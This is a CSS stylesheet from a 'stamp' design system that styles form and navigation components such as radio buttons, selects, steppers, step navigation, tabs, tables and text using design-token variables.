.stamp-password-input__toggle-button { display: flex; align-items: center; gap: var(--stamp-spacing-inner-s); border: medium; background-color: transparent; cursor: pointer; font-family: var(--stamp-text-cta-default-font-family); font-weight: var(--stamp-text-cta-default-font-weight); font-size: var(--stamp-text-cta-default-font-size); letter-spacing: var(--stamp-text-cta-default-letter-spacing); color: var(--stamp-color-text-link-default); outline-offset: var(--stamp-spacing-inner-xxs); position: absolute; right: 0px; top: 0px; transform: translateY(calc(-100% - var(--stamp-spacing-inner-s))); }

.stamp-password-input__toggle-button:focus { border-radius: var(--stamp-radius-xs); outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

.stamp-radio-button { position: relative; }

.stamp-radio-button--disabled .stamp-radio-button__label { cursor: not-allowed; border-color: var(--stamp-color-border-disabled); }

.stamp-radio-button--invalid .stamp-radio-button__label { border-color: var(--stamp-color-border-error); }

.stamp-radio-button__label { position: relative; cursor: pointer; padding-inline-start: var(--stamp-spacing-inner-4-xl); padding-inline-end: var(--stamp-spacing-inner-l); min-block-size: 72px; display: flex; align-items: center; border-style: solid; border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-fallback); border-radius: var(--stamp-radius-xs); background-color: var(--stamp-color-background-variant); color: var(--stamp-color-text-form-control-value-default); }

.stamp-radio-button__illustration { position: relative; margin-inline-start: calc(var(--stamp-spacing-inner-m) * -1); opacity: var(--stamp-opacity-illustration-default); mix-blend-mode: var(--stamp-blend-mode-default); }

.stamp-radio-button--disabled .stamp-radio-button__illustration { opacity: var(--stamp-opacity-illustration-disabled); mix-blend-mode: var(--stamp-blend-mode-disabled); }

.stamp-radio-button__illustration-badge { display: block; position: absolute; inline-size: 30%; block-size: 30%; inset-block-start: 12%; inset-inline-end: 8%; }

.stamp-radio-button__illustration-badge .stamp-icon, .stamp-radio-button__illustration-badge svg { display: block; inline-size: 100%; block-size: 100%; }

.stamp-radio-button__text-content { display: flex; flex-direction: column; padding-block: calc(var(--stamp-spacing-inner-l) - var(--stamp-border-width-s)); padding-inline-start: var(--stamp-spacing-inner-s); }

.stamp-radio-button:not(.stamp-radio-button--disabled):hover .stamp-radio-button__label { border-color: var(--stamp-color-border-hover); }

.stamp-radio-button .stamp-radio-button__input:focus ~ .stamp-radio-button__label { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 5px; }

@supports selector(:focus-visible) {
  .stamp-radio-button .stamp-radio-button__input:focus ~ .stamp-radio-button__label { outline: none; }
  .stamp-radio-button .stamp-radio-button__input:focus-visible ~ .stamp-radio-button__label { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 5px; }
}

.stamp-radio-button__title { font-family: var(--stamp-text-form-label-font-family), sans-serif; font-weight: var(--stamp-text-form-label-font-weight); line-height: var(--stamp-text-form-label-line-height); font-size: var(--stamp-text-form-label-font-size); letter-spacing: var(--stamp-text-form-label-letter-spacing); }

.stamp-radio-button__message { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-radio-button__input { appearance: none; font: inherit; margin: 0px; padding: calc(var(--stamp-spacing-inner-xs) - var(--stamp-border-width-s)); inline-size: 20px; block-size: 20px; border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-border-strong); border-radius: 50%; position: absolute; inset-inline-start: var(--stamp-spacing-inner-l); inset-block-start: 50%; transform: translateY(-50%); z-index: 1; background-color: var(--stamp-color-background-surface); }

.stamp-radio-button__input:checked:not(:disabled)::after { content: &quot;&quot;; position: absolute; inline-size: 100%; block-size: 100%; inset-inline-start: 0px; inset-block-start: 0px; border-radius: 50%; padding: calc(var(--stamp-spacing-inner-xs) - var(--stamp-border-width-s)); background: var(--stamp-color-icon-selected) content-box; }

.stamp-radio-button__input:focus-visible { outline: none; }

.stamp-radio-button--disabled .stamp-radio-button__input { cursor: not-allowed; background-color: var(--stamp-color-background-disabled); border-color: var(--stamp-color-border-disabled); }

.stamp-radio-button__input:disabled:checked { background: linear-gradient(
                to right,
                var(--stamp-color-icon-disabled) 0,
                var(--stamp-color-icon-disabled) 100%
            )
            content-box,
        var(--stamp-color-background-disabled); }

.stamp-radio-button__input:checked:not(:disabled) ~ .stamp-radio-button__label::before { content: &quot;&quot;; position: absolute; inset-inline-start: calc(-1 * (var(--stamp-border-width-s))); inset-block-start: calc(-1 * var(--stamp-border-width-s)); inline-size: calc(100% + (2 * var(--stamp-border-width-s))); block-size: calc(100% + (2 * var(--stamp-border-width-s))); outline: 2px solid var(--stamp-color-border-selected); outline-offset: 2px; border-radius: var(--stamp-radius-xs); }

.stamp-radio-button--invalid .stamp-radio-button__input:checked:not(:disabled) ~ .stamp-radio-button__label { border-color: var(--stamp-color-border-error); }

.stamp-radio-button__input--disabled ~ .stamp-radio-button__label { background-color: var(--stamp-color-background-disabled); color: var(--stamp-color-text-form-control-value-disabled); }

.stamp-radio-input { appearance: none; font: inherit; margin: 0px; padding: calc(var(--stamp-spacing-inner-xs) - var(--stamp-border-width-s)); inline-size: 20px; block-size: 20px; border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-border-strong); border-radius: 50%; flex-shrink: 0; align-self: start; margin-block-start: 2px; background-color: var(--stamp-color-background-surface); }

.stamp-radio-input:hover:enabled { border-color: var(--stamp-color-border-hover); }

.stamp-radio-input:not(.stamp-radio-input--invalid):checked:not(:disabled) { background: var(--stamp-color-icon-selected) content-box; }

.stamp-radio-input--invalid:checked { background: var(--stamp-color-icon-negative) content-box; }

.stamp-radio-input:focus-visible { outline-offset: 1px; outline-width: var(--stamp-border-width-m); outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); }

.stamp-radio-input:disabled { cursor: not-allowed; background-color: var(--stamp-color-background-disabled); border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-disabled); }

.stamp-radio-input:disabled:checked { background: linear-gradient(
                to right,
                var(--stamp-color-icon-disabled) 0,
                var(--stamp-color-icon-disabled) 100%
            )
            content-box,
        var(--stamp-color-background-disabled); }

.stamp-radio-input--invalid { border-color: var(--stamp-color-border-error); }

.stamp-requirement-list { padding: 0px; margin: 0px; }

.stamp-requirement-list-item { list-style-type: none; min-block-size: var(--stamp-size-icon-m); font-family: var(--stamp-text-form-feedback-font-family); font-weight: var(--stamp-text-form-feedback-font-weight); font-size: var(--stamp-text-form-feedback-font-size); letter-spacing: var(--stamp-text-form-feedback-letter-spacing); }

.stamp-requirement-list-item--disc { list-style-type: disc; margin-left: 20px; font-family: var(--stamp-text-body-s-default-font-family); font-weight: var(--stamp-text-body-s-default-font-weight); font-size: var(--stamp-text-body-s-default-font-size); letter-spacing: var(--stamp-text-body-s-default-letter-spacing); }

.stamp-requirement-list-item--icon { margin-left: -4px; }

.stamp-requirement-list-item__content { display: flex; }

.stamp-requirement-list-item--met { color: var(--stamp-color-text-positive); }

.stamp-requirement-list-item--unmet { color: var(--stamp-color-text-negative); }

.stamp-select-input { padding-inline-start: var(--stamp-spacing-inner-l); padding-inline-end: var(--stamp-spacing-inner-xxl); padding-block: var(--stamp-spacing-inner-s); border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-strong); font-family: var(--stamp-text-body-m-default-font-family), sans-serif; line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); border-radius: var(--stamp-radius-s); border-style: solid; background-position: calc(100% - 16px) center; background-repeat: no-repeat; background-attachment: scroll; background-image: url(&quot;&quot;); background-size: auto; background-origin: padding-box; background-clip: border-box; appearance: none; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; font-weight: var(--stamp-text-body-m-default-font-weight); inline-size: 100%; background-color: var(--stamp-color-background-surface); color: var(--stamp-color-text-form-control-value-default); -webkit-text-fill-color: var(--stamp-color-text-form-control-value-default); }

.stamp-select-input:not(:disabled):hover { border-color: var(--stamp-color-border-hover); }

.stamp-select-input:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

.stamp-select-input:disabled { border-color: var(--stamp-color-border-disabled); cursor: not-allowed; background-position: calc(100% - 16px) center; background-repeat: no-repeat; background-attachment: scroll; background-image: url(&quot;&quot;); background-size: auto; background-origin: padding-box; background-clip: border-box; background-color: var(--stamp-color-background-default); -webkit-text-fill-color: var(--stamp-color-text-form-control-value-disabled); color: var(--stamp-color-text-form-control-value-disabled); }

.stamp-select-input--invalid { border-color: var(--stamp-color-border-error); }

.stamp-select-input--size-narrow { inline-size: 50%; }

.stamp-select-input--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-select-input { inline-size: 50%; }
  .stamp-select-input--size-narrow { inline-size: 25%; }
  .stamp-select-input--size-full { inline-size: 100%; }
}

.stamp-skip-links:focus-within { display: flex; justify-content: center; }

.stamp-skip-link, a.stamp-skip-link { display: block; align-items: center; justify-content: center; gap: var(--stamp-spacing-inner-s); cursor: pointer; font-family: var(--stamp-text-cta-default-font-family), sans-serif; font-weight: var(--stamp-text-cta-default-font-weight); line-height: var(--stamp-text-cta-default-line-height); font-size: var(--stamp-text-cta-default-font-size); letter-spacing: var(--stamp-text-cta-default-letter-spacing); color: var(--stamp-color-text-link-default); border-radius: var(--stamp-radius-xs); border: medium; background: var(--stamp-color-background-surface); padding-inline: var(--stamp-spacing-inner-s); padding-block: 0px; position: absolute; inset-inline-start: -10000px; inset-block-start: auto; overflow: hidden; z-index: 99999; inline-size: auto; block-size: auto; }

.stamp-skip-link:hover { font-family: var(--stamp-text-cta-hover-font-family), sans-serif; font-weight: var(--stamp-text-cta-hover-font-weight); line-height: var(--stamp-text-cta-hover-line-height); text-decoration: var(--stamp-text-cta-hover-text-decoration); font-size: var(--stamp-text-cta-hover-font-size); color: var(--stamp-color-text-link-hover); }

.stamp-skip-link:active { font-family: var(--stamp-text-cta-pressed-font-family), sans-serif; font-weight: var(--stamp-text-cta-pressed-font-weight); line-height: var(--stamp-text-cta-pressed-line-height); text-decoration: var(--stamp-text-cta-pressed-text-decoration); font-size: var(--stamp-text-cta-pressed-font-size); color: var(--stamp-color-text-link-pressed); }

.stamp-skip-link:focus { position: fixed; inset-inline-start: 50%; transform: translateX(-50%); outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); }

.stamp-step-navigation { inline-size: 100%; z-index: var(--z-index-base); }

.stamp-step-navigation__steps { display: flex; flex-direction: row; list-style-type: none; margin-inline: var(--stamp-spacing-inner-s); margin-block-start: var(--stamp-spacing-outer-s); }

.stamp-step-navigation__label { text-align: center; font-weight: var(--stamp-text-step-default-font-weight); margin-block-start: var(--stamp-spacing-inner-s); }

.stamp-step-navigation__label--focused { color: var(--stamp-color-text-link-hover); }

.stamp-step-navigation__illustration { display: flex; justify-content: center; margin-block-end: var(--stamp-spacing-inner-s); }

.stamp-step-navigation__line { block-size: var(--stamp-border-width-m); flex-grow: 1; margin-block-start: 10px; }

.stamp-step-navigation__line--has-illustration { margin-block-start: calc(
        (var(--stamp-size-illustration-m) + 10px) + var(--stamp-spacing-inner-s)
    ); }

.stamp-step-navigation__line--todo { background-color: var(--stamp-color-border-strong); }

.stamp-step-navigation__line--done { background-color: var(--stamp-color-border-brand); }

@media (min-width: 768px) {
  .stamp-step-navigation__steps { margin-inline: var(--stamp-spacing-inner-l); margin-block-start: var(--stamp-spacing-outer-m); }
}

.stamp-step-navigation-step { position: relative; display: flex; flex-direction: column; text-align: center; z-index: var(--z-index-base); }

.stamp-step-navigation-step__step { position: relative; display: flex; flex-direction: row; justify-content: center; margin-block-end: calc(26px + var(--stamp-spacing-inner-s)); margin-block-start: 0px; }

.stamp-step-navigation-step__step--has-illustration { margin-block-start: calc(80px + var(--stamp-spacing-inner-s)); }

.stamp-step-navigation-step__step--single-label { margin-block-end: 0px; }

.stamp-step-navigation-step__step--todo .stamp-step-navigation-step__dot { inline-size: 20px; block-size: 20px; border-style: solid; border-color: var(--stamp-color-border-strong); border-width: 2px; background-color: var(--stamp-color-background-surface); }

.stamp-step-navigation-step__step--current .stamp-step-navigation-step__dot { position: relative; inline-size: 14px; block-size: 14px; box-shadow: 0 0 0 3px var(--stamp-color-background-surface),
        0 0 0 5px var(--stamp-color-icon-brand); margin: 3px; background-color: var(--stamp-color-icon-brand); }

.stamp-step-navigation-step__step--done .stamp-step-navigation-step__dot { display: flex; justify-content: center; align-items: center; overflow: hidden; inline-size: 20px; block-size: 20px; background-color: var(--stamp-color-icon-brand); }

.stamp-step-navigation-step__dot { display: inline-block; border-radius: 50%; }

.stamp-step-navigation-step__dot .stamp-icon { inline-size: 12px; block-size: 12px; color: var(--stamp-color-icon-accent-default); }

.stamp-step-navigation-step__button, .stamp-step-navigation-step__button[disabled] { position: absolute; display: flex; flex-direction: column; justify-content: center; align-items: center; background-color: transparent; transform: translateY(calc(-100% + 50px)); border: medium; cursor: pointer; color: inherit; }

.stamp-step-navigation-step__button:disabled { cursor: not-allowed; }

.stamp-step-navigation-step__button--single-label { position: absolute; inline-size: 100%; block-size: 100%; transform: unset; }

.stamp-step-navigation-step__button:hover:not(:disabled):not(:active) .stamp-step-navigation-step__label { color: var(--stamp-color-text-link-default); }

.stamp-step-navigation-step:has(.stamp-step-navigation-step__button:hover:not(:disabled):not(:active)) .stamp-step-navigation-step__dot { background-color: var(--stamp-color-icon-hover); }

.stamp-step-navigation-step__button:active:not(:disabled):not(:focus) .stamp-step-navigation-step__label { color: var(--stamp-color-text-link-pressed); }

.stamp-step-navigation-step:has(.stamp-step-navigation-step__button:active:not(:disabled):not(:focus)) .stamp-step-navigation-step__dot { background-color: var(--stamp-color-icon-pressed); box-shadow: 0 0 0 1px var(--stamp-color-background-surface),
        0 0 0 3px var(--stamp-color-icon-pressed); }

.stamp-step-navigation-step__button:focus { border: medium; outline: none; }

.stamp-step-navigation-step__button:focus .stamp-step-navigation-step__label { color: var(--stamp-color-text-link-hover); }

.stamp-step-navigation-step:has(.stamp-step-navigation-step__button:focus) .stamp-step-navigation-step__dot { background-color: var(--stamp-color-icon-hover); box-shadow: 0 0 0 1px var(--stamp-color-background-surface),
    0 0 0 3px var(--stamp-color-icon-hover); }

.stamp-step-navigation-step__label { display: flex; justify-content: center; block-size: 50px; padding-block-start: calc(26px + var(--stamp-spacing-inner-s)); letter-spacing: var(--stamp-text-step-default-letter-spacing); line-height: var(--stamp-text-step-default-line-height); font-family: var(--stamp-text-step-default-font-family); font-size: var(--stamp-text-step-default-font-size); font-weight: var(--stamp-text-step-default-font-weight); }

.stamp-step-navigation-step:first-of-type .stamp-step-navigation-step__label, .stamp-step-navigation-step:last-of-type .stamp-step-navigation-step__label { max-inline-size: 84px; }

.stamp-step-navigation-step__step--todo .stamp-step-navigation-step__label { letter-spacing: var(--stamp-text-step-todo-letter-spacing); line-height: var(--stamp-text-step-todo-line-height); font-family: var(--stamp-text-step-todo-font-family); font-size: var(--stamp-text-step-todo-font-size); font-weight: var(--stamp-text-step-todo-font-weight); }

.stamp-step-navigation-step__illustration-wrapper { display: flex; justify-content: center; block-size: fit-content; padding-block-end: var(--stamp-spacing-inner-l); }

.stamp-step-navigation-step__illustration { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-xl); }

@media (min-width: 768px) {
  .stamp-step-navigation-step__illustration { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-xxl); }
}

.stamp-stepper { display: inline-flex; padding: 0px; margin: 0px; block-size: 32px; border-radius: var(--stamp-radius-s); max-inline-size: fit-content; border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-border-strong); }

.stamp-stepper--invalid, .stamp-stepper:has(input:invalid) { border-color: var(--stamp-color-border-error); }

.stamp-stepper__button { display: flex; justify-content: center; align-items: center; border-image: none; background: none; cursor: pointer; border-style: solid; border-color: transparent; inline-size: 32px; outline-offset: 1px; border-width: var(--stamp-border-width-s); margin: calc(var(--stamp-border-width-s) * -1); z-index: var(--z-index-base); }

.stamp-stepper__button:focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); }

@supports selector(:focus-visible) {
  .stamp-stepper__button:focus { outline: none; }
  .stamp-stepper__button:focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); }
}

.stamp-stepper__button:first-of-type { border-radius: var(--stamp-radius-s) 0 0 var(--stamp-radius-s); }

.stamp-stepper__button:last-of-type { border-radius: 0 var(--stamp-radius-s) var(--stamp-radius-s) 0; }

.stamp-stepper__button:hover { border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-hover); z-index: var(--z-index-base); }

.stamp-stepper__button:active { border-color: var(--stamp-color-border-pressed); z-index: var(--z-index-base); }

.stamp-stepper__button:active .stamp-stepper__button-icon { color: var(--stamp-color-icon-pressed); }

.stamp-stepper__button:disabled { background-color: var(--stamp-color-background-disabled); border-color: var(--stamp-color-border-disabled); cursor: not-allowed; border-style: solid; }

.stamp-stepper--invalid .stamp-stepper__button:disabled { border: medium; margin: 0px; inline-size: 30px; }

.stamp-stepper__button:disabled:first-of-type { z-index: var(--z-index-base); }

.stamp-stepper__button:disabled:last-of-type { z-index: var(--z-index-base); }

.stamp-stepper__button:disabled .stamp-stepper__button-icon { color: var(--stamp-color-icon-disabled); }

.stamp-stepper__button-icon { color: var(--stamp-color-text-icon-button-default); }

.stamp-stepper__input { max-inline-size: 30px; border-radius: 0px; border-block: medium; border-left-width: var(--stamp-border-width-s); border-left-style: solid; border-left-color: var(--stamp-color-border-strong); border-right-width: var(--stamp-border-width-s); border-right-style: solid; border-right-color: var(--stamp-color-border-strong); text-align: center; font-family: var(--stamp-text-body-m-default-font-family), sans-serif; line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); font-weight: var(--stamp-text-body-m-default-font-weight); outline-color: var(--stamp-color-border-focus-outline); background-color: var(--stamp-color-background-surface); color: var(--stamp-color-text-form-control-value-default); }

.stamp-stepper__input:focus { z-index: var(--z-index-base); outline-offset: 2px; outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); }

@supports selector(:focus-visible) {
  .stamp-stepper__input:focus { outline: none; }
  .stamp-stepper__input:focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); }
}

.stamp-table { position: relative; background-color: var(--stamp-color-background-surface); }

.stamp-table::before, .stamp-table::after { content: &quot;&quot;; pointer-events: none; position: absolute; display: block; block-size: 100%; inline-size: 48px; top: 0px; opacity: 0; transition: opacity 0.1s ease-in-out; }

.stamp-table::before { inset-inline-start: 0px; background: linear-gradient(to right, var(--stamp-color-background-surface), transparent); }

.stamp-table::after { inset-inline-end: 0px; background: linear-gradient(to left, var(--stamp-color-background-surface), transparent); }

.stamp-table--overflow-start::before, .stamp-table--overflow-end::after { opacity: 1; }

.stamp-table table { border-collapse: collapse; border-spacing: 0px; color: var(--stamp-color-text-default); }

.stamp-table tr { border-block-end: var(--stamp-border-width-s) solid var(--stamp-color-border-default); }

.stamp-table td, .stamp-table th { padding: var(--stamp-spacing-inner-l); white-space: nowrap; background-color: var(--stamp-color-background-surface); }

.stamp-table th { font-family: var(--stamp-text-heading-xs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); letter-spacing: var(--stamp-text-heading-xs-letter-spacing); }

.stamp-table td { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-table--has-hover tr:hover td { background-color: var(--stamp-color-background-default); cursor: pointer; }

.stamp-table__scroll-container { inline-size: 100%; overflow: auto; border-radius: var(--stamp-radius-xs); }

.stamp-table__scroll-container:focus { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-table__scroll-container:focus { outline: none; }
  .stamp-table__scroll-container:focus-visible { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-tab { scroll-snap-align: center; position: relative; padding-block: var(--stamp-spacing-inner-l); padding-inline: var(--stamp-spacing-inner-xl); border: medium; color: var(--stamp-color-text-default); background-color: transparent; cursor: pointer; display: flex; align-items: center; gap: var(--stamp-spacing-inner-s); border-block-end-width: ; border-block-end-style: solid; border-block-end-color: transparent; margin-block-end: calc(-1 * var(--stamp-border-width-s)); }

.stamp-tab:hover { border-block-end-color: var(--stamp-color-border-hover); }

.stamp-tab:active { border-block-end-color: var(--stamp-color-border-pressed); }

.stamp-tab:focus:not(:active) { outline-offset: 1px; outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-radius-s); }

@supports selector(:focus-visible) {
  .stamp-tab:focus:not(:active) { outline: none; }
  .stamp-tab:focus-visible:not(:active) { outline-offset: 1px; outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-radius-s); }
}

.stamp-tab[data-state=&quot;active&quot;]:not(:active)::before { content: &quot;&quot;; position: absolute; inline-size: 100%; background-color: var(--stamp-color-border-selected); block-size: var(--stamp-border-width-l); inset-block-end: 0px; inset-inline-start: 0px; margin-bottom: calc(-1 * var(--stamp-border-width-s)); }

.stamp-tab__indicator { display: flex; justify-content: center; align-items: center; border-radius: var(--stamp-radius-l); padding-block: 0px; padding-inline: var(--stamp-spacing-inner-s); block-size: 24px; inline-size: 100%; background-color: var(--stamp-color-background-strong); color: var(--stamp-color-text-inverse); font-family: var(--stamp-text-badge-default-font-family), sans-serif; font-weight: var(--stamp-text-badge-default-font-weight); line-height: var(--stamp-text-badge-default-line-height); font-size: var(--stamp-text-badge-default-font-size); letter-spacing: var(--stamp-text-badge-default-letter-spacing); }

.stamp-tab:hover .stamp-tab__indicator { background-color: var(--stamp-color-icon-hover); }

.stamp-tab:active .stamp-tab__indicator { background-color: var(--stamp-color-icon-pressed); }

.stamp-tab > .stamp-tab__indicator { background-color: var(--stamp-color-icon-selected); }

.stamp-tab__content { font-family: var(--stamp-text-heading-xs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); letter-spacing: var(--stamp-text-heading-xs-letter-spacing); flex-grow: 1; white-space: nowrap; }

.stamp-tab__icon { display: flex; justify-content: center; align-items: center; max-inline-size: var(--stamp-size-icon-m); max-block-size: var(--stamp-size-icon-m); }

.stamp-tab__icon > svg { inline-size: var(--stamp-size-icon-m); block-size: var(--stamp-size-icon-m); }

.stamp-tab[data-state=&quot;active&quot;]:not(:active) > .stamp-tab__icon { color: var(--stamp-color-icon-selected); }

.stamp-tab:hover:not([data-state=&quot;active&quot;]) > .stamp-tab__icon { color: var(--stamp-color-icon-hover); }

.stamp-tab:active > .stamp-tab__icon { color: var(--stamp-color-icon-pressed); }

.stamp-tab-content { position: relative; z-index: var(--z-index-above); }

.stamp-tab-content:focus { outline-offset: 1px; outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-radius-xs); }

.stamp-tab-list { position: relative; }

.stamp-tab-list__list { scroll-snap-type: x mandatory; scroll-behavior: smooth; overflow: auto hidden; border-block-end-width: var(--stamp-border-width-s); border-block-end-style: solid; border-block-end-color: var(--stamp-color-border-default); display: flex; scrollbar-width: none; }

.stamp-tab-list__list::-webkit-scrollbar { display: none; }

.stamp-tab-list__fade { position: absolute; z-index: var(--z-index-above); inset-block: 0px 1px; display: flex; align-items: center; pointer-events: none; }

.stamp-tab-list__fade--start::after, .stamp-tab-list__fade--end::before { content: &quot;&quot;; display: block; width: 24px; height: 100%; }

.stamp-tab-list__fade--start::after { background: var(--stamp-color-overflow-inline-start); }

.stamp-tab-list__fade--end::before { background: var(--stamp-color-overflow-inline-end); }

.stamp-tab-list__fade--start { inset-inline-start: 0px; }

.stamp-tab-list__fade--end { inset-inline-end: 0px; }

.stamp-tab-list .stamp-icon-button { padding-inline: var(--stamp-spacing-inner-m); height: 52px; width: 100%; background: var(--stamp-color-background-surface); margin-block-end: 1px; pointer-events: auto; }

.stamp-text { color: var(--stamp-color-text-default); }

.stamp-text--variant-default { color: var(--stamp-color-text-default); }

.stamp-text--variant-subtle { color: var(--stamp-color-text-subtle); }

.stamp-text--size-s { font-family: var(--stamp-text-body-s-default-font-family), sans-serif; font-weight: var(--stamp-text-body-s-default-font-weight); line-height: var(--stamp-text-body-s-default-line-height); font-size: var(--stamp-text-body-s-default-font-size); letter-spacing: var(--stamp-text-body-s-default-letter-spacing); }

.stamp-text--size-m { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-text--size-l { font-family: var(--stamp-text-body-l-default-font-family), sans-serif; font-weight: var(--stamp-text-body-l-default-font-weight); line-height: var(--stamp-text-body-l-default-line-height); font-size: var(--stamp-text-body-l-default-font-size); letter-spacing: var(--stamp-text-body-l-default-letter-spacing); }

.stamp-text--variant-subtitle { color: var(--stamp-color-text-default); }

.stamp-text--variant-subtitle.stamp-text--size-s { font-family: var(--stamp-text-subtitle-s-font-family); font-weight: var(--stamp-text-subtitle-s-font-weight); line-height: var(--stamp-text-subtitle-s-line-height); font-size: var(--stamp-text-subtitle-s-font-size); letter-spacing: var(--stamp-text-subtitle-s-letter-spacing); }

.stamp-text--variant-subtitle.stamp-text--size-m { font-family: var(--stamp-text-subtitle-m-font-family); font-weight: var(--stamp-text-subtitle-m-font-weight); line-height: var(--stamp-text-subtitle-m-line-height); font-size: var(--stamp-text-subtitle-m-font-size); letter-spacing: var(--stamp-text-subtitle-m-letter-spacing); }

.stamp-text--variant-subtitle.stamp-text--size-l { font-family: var(--stamp-text-subtitle-l-font-family); font-weight: var(--stamp-text-subtitle-l-font-weight); line-height: var(--stamp-text-subtitle-l-line-height); font-size: var(--stamp-text-subtitle-l-font-size); letter-spacing: var(--stamp-text-subtitle-l-letter-spacing); }

.stamp-text a { color: var(--stamp-color-text-link-default); text-decoration-thickness: 1px; }

.stamp-text a:hover { color: var(--stamp-color-text-link-hover); }

.stamp-text a:active { color: var(--stamp-color-text-link-pressed); }

.stamp-text a:hover, .stamp-text a:active { text-decoration-thickness: 2px; }

.stamp-text a:focus { color: var(--stamp-color-text-link-default); }

.stamp-text a:focus { outline-color: var(--stamp-color-border-focus-outline); }

.stamp-text a:visited { color: var(--stamp-color-text-link-visited); }

.stamp-text--size-s strong { font-weight: bold; font-family: var(--stamp-text-body-s-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-s-emphasis-line-height); font-size: var(--stamp-text-body-s-emphasis-font-size); letter-spacing: var(--stamp-text-body-s-emphasis-letter-spacing); }

.stamp-text--size-s em { font-style: italic; font-family: var(--stamp-text-body-s-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-s-emphasis-line-height); font-size: var(--stamp-text-body-s-emphasis-font-size); letter-spacing: var(--stamp-text-body-s-emphasis-letter-spacing); }

.stamp-text--size-m strong { font-weight: bold; font-family: var(--stamp-text-body-m-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-m-emphasis-line-height); font-size: var(--stamp-text-body-m-emphasis-font-size); letter-spacing: var(--stamp-text-body-m-emphasis-letter-spacing); }

.stamp-text--size-m em { font-style: italic; font-family: var(--stamp-text-body-m-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-m-emphasis-line-height); font-size: var(--stamp-text-body-m-emphasis-font-size); letter-spacing: var(--stamp-text-body-m-emphasis-letter-spacing); }

.stamp-text--size-l strong { font-weight: bold; font-family: var(--stamp-text-body-l-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-l-emphasis-line-height); font-size: var(--stamp-text-body-l-emphasis-font-size); letter-spacing: var(--stamp-text-body-l-emphasis-letter-spacing); }

.stamp-text--size-l em { font-style: italic; font-family: var(--stamp-text-body-l-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-l-emphasis-line-height); font-size: var(--stamp-text-body-l-emphasis-font-size); letter-spacing: var(--stamp-text-body-l-emphasis-letter-spacing); }

.stamp-textarea-input { padding-inline: var(--stamp-spacing-inner-l); padding-block: var(--stamp-spacing-inner-s); border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-strong); font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); border-radius: var(--stamp-radius-s); border-style: solid; resize: none; inline-size: 100%; background-color: var(--stamp-color-background-surface); color: var(--stamp-color-text-form-control-value-default); }

